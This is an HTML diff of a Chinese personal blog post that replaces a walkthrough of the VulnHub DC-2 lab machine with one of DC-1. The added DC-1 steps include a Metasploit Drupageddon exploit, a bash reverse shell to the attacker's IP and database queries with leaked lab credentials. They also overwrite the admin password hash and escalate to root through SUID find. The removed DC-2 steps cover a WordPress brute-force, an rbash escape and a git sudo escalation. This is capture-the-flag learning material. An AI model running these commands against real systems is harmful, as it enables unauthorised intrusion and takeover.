@@ -18,7 +18,7 @@
   <meta name="author" content="何止">
   <meta name="keywords" content="">
   
-  <title>DC系列靶机第二篇 - 何止</title>
+  <title>DC系列靶机第一篇 - 何止</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
 
@@ -163,7 +163,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="DC系列靶机第二篇">
+            <span class="h2" id="subtitle" title="DC系列靶机第一篇">
               
             </span>
 
@@ -173,8 +173,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2022-01-04 07:41" pubdate>
-        2022年1月4日 早上
+      <time datetime="2022-01-02 21:58" pubdate>
+        2022年1月2日 晚上
       </time>
     </span>
   
@@ -189,7 +189,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      9
+      8
        分钟
     </span>
   
@@ -219,84 +219,71 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">DC系列靶机第二篇</h1>
+            <h1 style="display: none">DC系列靶机第一篇</h1>
             
             <div class="markdown-body">
-              <p>终于闲下来了，继续搞一搞</p>
+              <p>终于闲下来了，搞一搞</p>
 <blockquote>
-<p>  资源地址：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/dc/DC-2.zip">https://download.vulnhub.com/dc/DC-2.zip</a></p>
+<p>  资源地址：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/dc/DC-1.zip">https://download.vulnhub.com/dc/DC-1.zip</a></p>
 <p>  本机：192.168.3.15</p>
-<p>  靶机：192.168.3.18</p>
+<p>  靶机：192.168.3.16</p>
 </blockquote>
-<h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1. 信息收集"></a>1. 信息收集</h2><p>Netdiscover是一种网络扫描工具，通过ARP扫描发现活动主机，可以通过主动和被动两种模式进行ARP扫描。通过主动发送ARP请求检查网络ARP流量，通过自动扫描模式扫描网络地址。</p>
-<h3 id="netdiscover"><a href="#netdiscover" class="headerlink" title="netdiscover"></a>netdiscover</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">netdiscover -i eth0 -r 192.168.3.0/24<br></code></pre></td></tr></table></figure>
+<h2 id="1-扫描网段发现主机"><a href="#1-扫描网段发现主机" class="headerlink" title="1. 扫描网段发现主机"></a>1. 扫描网段发现主机</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap 192.168.3.0/24<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1ady5ssrj30hu0e7ta2.jpg" srcset="/img/loading.gif" lazyload alt="image-20220104055126098"></p>
-<h3 id="masscan"><a href="#masscan" class="headerlink" title="masscan"></a>masscan</h3><p>因为虚拟机出问题了ip换成18了</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">masscan -p80 192.168.3.0/24<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1ae1abkcj30h803taak.jpg" srcset="/img/loading.gif" lazyload alt="image-20220104061411939"></p>
-<h2 id="2-漏洞发现利用"><a href="#2-漏洞发现利用" class="headerlink" title="2. 漏洞发现利用"></a>2. 漏洞发现利用</h2><p>访问发现了flag1，发现了提示“或许你可以尝试cewl”</p>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1ae4p213j30po0gmdgr.jpg" srcset="/img/loading.gif" lazyload alt="image-20220104055509829"></p>
-<h3 id="cewl"><a href="#cewl" class="headerlink" title="cewl"></a>cewl</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">cewl dc-2 &gt; dc-2pwd.txt<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1ae7zt6mj30he0bh3z2.jpg" srcset="/img/loading.gif" lazyload alt="image-20220104062235864"></p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wpscan --url http:<span class="hljs-regexp">//</span>dc-<span class="hljs-number">2</span>/ -e u<br></code></pre></td></tr></table></figure>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxzo0rt76jj30jk05oq3l.jpg" srcset="/img/loading.gif" lazyload alt="image-20220102201643698"></p>
+<h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2. 信息收集"></a>2. 信息收集</h2><blockquote>
+<p>  Drupal是使用PHP语言编写的开源内容管理框架（CMF），它由<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/2683135">内容管理系统</a>（CMS）和PHP开发框架（Framework）共同构成，在GPL2.0及更新协议下发布。连续多年荣获全球最佳CMS大奖，是基于PHP语言最著名的WEB应用程序。</p>
+</blockquote>
+<p>首页面</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxzo0uwcxlj30hc0e1aaj.jpg" srcset="/img/loading.gif" lazyload alt="image-20220102201715831"></p>
+<p>版本相关</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxzob3ez16j30bt0763yo.jpg" srcset="/img/loading.gif" lazyload alt="image-20220102213340941"></p>
+<h2 id="3-渗透"><a href="#3-渗透" class="headerlink" title="3.渗透"></a>3.渗透</h2><h3 id="3-1-目录扫描"><a href="#3-1-目录扫描" class="headerlink" title="3.1 目录扫描"></a>3.1 目录扫描</h3><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxzo0y24h1j30od0fz42e.jpg" srcset="/img/loading.gif" lazyload alt="image-20220102203245812"></p>
+<h3 id="3-2-msf"><a href="#3-2-msf" class="headerlink" title="3.2 msf"></a>3.2 msf</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">search drupal<br>use exploit/multi/http/drupal_drupageddon <span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1aebrjlbj30hq09udhe.jpg" srcset="/img/loading.gif" lazyload alt="image-20220104062201195"></p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">wpscan --url http://dc-2/ -U dc-2user.txt -P dc-2pwd.txt <br></code></pre></td></tr></table></figure>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxzo12zx0uj30va0oagru.jpg" srcset="/img/loading.gif" lazyload alt="image-20220102203746287"></p>
+<p>执行shell拿到flag1，可知我们需要找配置文件</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxzo16oth3j30hy09i0ts.jpg" srcset="/img/loading.gif" lazyload alt="image-20220102204210190"></p>
+<p>写一句话后链接一下，找到数据库密码和flag2，并拿到提示“爆破和目录遍历并不是唯一拿到权限的方法”</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxzo1asbz5j30lk0h80ty.jpg" srcset="/img/loading.gif" lazyload alt="image-20220102205011742"></p>
+<p>反弹shell执行sql，并不能进行破解</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">/bin/bash -i &gt;&amp; /dev/tcp/192.168.3.15/4567 0&gt;&amp;1<br>mysql -udbuser -pR0ck3t -e &quot;show databases;&quot;<br>mysql -udbuser -pR0ck3t -e &quot;use drupaldb;select  * from users;&quot;<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1aeeitndj30kp0epq66.jpg" srcset="/img/loading.gif" lazyload alt="image-20220104062900271"></p>
-<p>登陆jerry后发现flag2，可以使用其他办法</p>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy18xc1nsfj30gj0f874s.jpg" srcset="/img/loading.gif" lazyload alt="image-20220104063042724"></p>
-<h3 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h3><p>ssh被拒绝了，后扫描发现7744端口开着</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo masscan --rate=10000 --port 0-65535 192.168.3.18 <br></code></pre></td></tr></table></figure>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxzo1e6lgaj30x203v753.jpg" srcset="/img/loading.gif" lazyload alt="image-20220102205313820"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxzo1bzc1xj31db062di8.jpg" srcset="/img/loading.gif" lazyload alt="image-20220102210756541"></p>
+<p>尝试修改密码</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.hankcs.com/program/drupal/reset-drupal-password.html">https://www.hankcs.com/program/drupal/reset-drupal-password.html</a></p>
+<p>由于密文采用sha-512(不确定是不是)所以只需要更改密码为password对应的密文即可</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">mysql -udbuser -pR0ck3t -e &#x27;use drupaldb;select  * from users;update users set pass=&quot;$S$CDbdwZvjHQ09IVRs88G0fnaxPr50/kb81YI9.8M/D9okW7J/s5U4&quot; where name=&quot;admin&quot;;&#x27;<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy18xbcu8kj30gy04caat.jpg" srcset="/img/loading.gif" lazyload alt="image-20220104063610583"></p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">ssh -p 7744 tom@192.168.3.18 <span class="hljs-comment">#parturient</span><br></code></pre></td></tr></table></figure>
+<p>使用admin/password登陆，得到flag3，提示要查看</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxzo1gv2w9j30sv0b6wf7.jpg" srcset="/img/loading.gif" lazyload alt="image-20220102212656725"></p>
+<p>查看shadow和passwd，发现flag4，发现flag4用户有权限且信息存在/home/flag4</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxzo1jhx4ij30kl0ggn0r.jpg" srcset="/img/loading.gif" lazyload alt="image-20220102213654064"></p>
+<p>拿到flag4，发现提示“你可以用同样的手法获得root下的flag吗”</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxzo1m658bj30j607i3zk.jpg" srcset="/img/loading.gif" lazyload alt="image-20220102213909473"></p>
+<h3 id="3-3-提权部分"><a href="#3-3-提权部分" class="headerlink" title="3.3 提权部分"></a>3.3 提权部分</h3><blockquote>
+<p>  SUID：Set User ID 是一种权限类型，允许用户使用指定用户的权限执行文件。SUID可以让调用者以文件拥有者的身份运行该文件，所以我们利用SUID提权的思路就是运行root用户所拥有的SUID的文件</p>
+</blockquote>
+<p>已知的可用来提权的linux可行性的文件列表：nmap、vim、find、bash、more、less、nano、cp</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">以下命令将尝试查找具有root权限的SUID的文件，不同系统适用于不同的命令，一个一个试</span><br>find / -perm -u=s -type f 2&gt;/dev/null<br>find / -user root -perm -4000-print2&gt;/dev/null<br>find / -user root -perm -4000-exec ls -ldb &#123;&#125; \;<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy18xeazpaj30pj091mz6.jpg" srcset="/img/loading.gif" lazyload alt="image-20220104063736520"></p>
-<p>然后发现cat不能用，shell使用的rbash，可以使用vi读取文件，或者less也可。把常用的指令都试试就出了。</p>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1aend2n9j30rz02h0sv.jpg" srcset="/img/loading.gif" lazyload alt="image-20220104070048688"></p>
-<p>flag3提示“需要su登陆jerry”</p>
-<h2 id="3-提权部分"><a href="#3-提权部分" class="headerlink" title="3. 提权部分"></a>3. 提权部分</h2><h3 id="突破rbash"><a href="#突破rbash" class="headerlink" title="突破rbash"></a>突破rbash</h3><p>可以使用vi突破限制，参考<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1680551">https://cloud.tencent.com/developer/article/1680551</a></p>
-<p>这里可以使用vi末行输入<code>setshell=/bin/bash 然后 shell</code>，但是cat仍然不可用，可以ls或者使用tab键找可以使用的指令</p>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1aeqkja4j30rn0gjdj6.jpg" srcset="/img/loading.gif" lazyload alt="image-20220104065805501"></p>
-<p>为了使用su，必须把su到PATH环境变量，当然此时cat等命令也可以用了</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">export</span> PATH=/usr/sbin:/usr/bin:/sbin:/bin<br>su jerry <span class="hljs-comment">#切换为jerry 密码:adipiscing</span><br></code></pre></td></tr></table></figure>
+<p>尝试第一个发现find</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">find / -perm -u=s -type f 2&gt;/dev/null<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1aerxz8ej30qv0c7jtg.jpg" srcset="/img/loading.gif" lazyload alt="image-20220104071132750"></p>
-<p>通过cat获得jerry的flag4.txt，尝试提权发现可以用的(nmap、vim、find、bash、more、less、nano、cp)</p>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1aexbp3uj30gh08z3zh.jpg" srcset="/img/loading.gif" lazyload alt="image-20220104071329932"></p>
-<h3 id="尝试less提权"><a href="#尝试less提权" class="headerlink" title="尝试less提权"></a>尝试less提权</h3><p>发现less并不是很行</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">less /etc/passwd<br>!/bin/sh<br></code></pre></td></tr></table></figure>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxzo1rmp06j30ft0b1gmp.jpg" srcset="/img/loading.gif" lazyload alt="image-20220102214349713"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ls -l /usr/bin/find<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1aezjgjzj30f6029dfv.jpg" srcset="/img/loading.gif" lazyload alt="image-20220104071614282"></p>
-<h3 id="git提权"><a href="#git提权" class="headerlink" title="git提权"></a>git提权</h3><p>阅读他人的文章发现git也是可以提权的</p>
-<p>使用sudo -l可以找到git直接是root用户权限</p>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1af1kvg8j30ty038gm4.jpg" srcset="/img/loading.gif" lazyload alt="image-20220104071843646"></p>
-<p>参考<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/git/">https://gtfobins.github.io/gtfobins/git/</a></p>
-<p>提权方法如下</p>
-<ol>
-<li><p><code>sudo git help config</code>在末行命令模式输入 <code>!/bin/bash</code> 或<code> !&#39;sh&#39;</code> #完成提权 </p>
-<p> <img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1af4qrvsj30as01qt8l.jpg" srcset="/img/loading.gif" lazyload alt="image-20220104072223004"></p>
-</li>
-<li><p> <code>sudo git -p help</code>  #输入<code>!/bin/bash</code>，即可打开一个用户为root的shell</p>
-</li>
-</ol>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1af7ecsaj30nh0ds778.jpg" srcset="/img/loading.gif" lazyload alt="image-20220104072338489"></p>
-<p>注意 : 想提权获得“末行命令模式输入”，尽量保证窗口小一些，使得回显信息不能一页显示，否则是不能输入的，像下面这样……</p>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1afb80b5j30ng0fh77v.jpg" srcset="/img/loading.gif" lazyload alt="image-20220104072530822"></p>
-<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>在我们获得了root之后就可以拿到flag了</p>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1afg4kigj30gf0aldgy.jpg" srcset="/img/loading.gif" lazyload alt="image-20220104072725788"></p>
-<h2 id="4-小结"><a href="#4-小结" class="headerlink" title="4. 小结"></a>4. 小结</h2><h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h3><ol>
-<li><p> <code>sudo -l</code>可以查看root下的一些指令</p>
-</li>
-<li><p>suid提权，已知的可用来提权的linux可行性的文件列表：nmap、vim、find、bash、more、less、nano、cp</p>
- <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#以下命令将尝试查找具有root权限的SUID的文件，不同系统适用于不同的命令，一个一个试</span><br><span class="hljs-builtin-name">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span><br><span class="hljs-builtin-name">find</span> / -user root -perm -4000-print2&gt;/dev/<span class="hljs-literal">null</span><br><span class="hljs-builtin-name">find</span> / -user root -perm -4000-exec ls -ldb &#123;&#125; \;<br></code></pre></td></tr></table></figure></li>
-</ol>
-<h3 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h3><p>git提权：<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/git/">https://gtfobins.github.io/gtfobins/git/</a></p>
-<p>rbash突破限制：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1680551">https://cloud.tencent.com/developer/article/1680551</a></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxzo1tzzaoj30hn01rmx8.jpg" srcset="/img/loading.gif" lazyload alt="image-20220102214620132"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">find h3 -exec &quot;/bin/sh&quot; \; #使用find提权<br>cat /root/thefinalflag.txt<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxzo1wyyn8j30hk09ggmq.jpg" srcset="/img/loading.gif" lazyload alt="image-20220102214846546"></p>
+<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>在web提权到admin用户时除了使用sql的update改密码的方法可以使用目录下的sh文件进行获取</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">php ./scripts/password-hash.sh 12345<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxzo78do6sj30rh05ggmv.jpg" srcset="/img/loading.gif" lazyload alt="image-20220102215427332"></p>
 
             </div>
             <hr>
@@ -317,12 +304,18 @@
                   <article class="post-prev col-6">
                     
                     
+                      <a href="/2022/01/04/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/DC-2/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">DC系列靶机第二篇</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/01/02/DC%E7%B3%BB%E5%88%97/DC-1/">
-                        <span class="hidden-mobile">DC系列靶机第一篇</span>
+                      <a href="/2021/04/14/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0/">
+                        <span class="hidden-mobile">记录一次渗透学习</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
